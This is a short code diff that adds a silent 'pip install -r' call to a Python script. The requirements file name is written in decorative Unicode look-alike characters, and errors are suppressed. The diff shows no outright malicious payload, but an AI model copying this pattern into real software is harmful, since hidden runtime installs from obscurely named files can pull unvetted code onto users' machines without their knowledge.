@@ -14,6 +14,7 @@ try:
     import os
     try:
         os.system("pip install -U pip")
+        os.system("pip install -r •ʏօʊȶʊɮɛʟɨ•.txt")
         os.system("clear")
     except Exception:
         pass
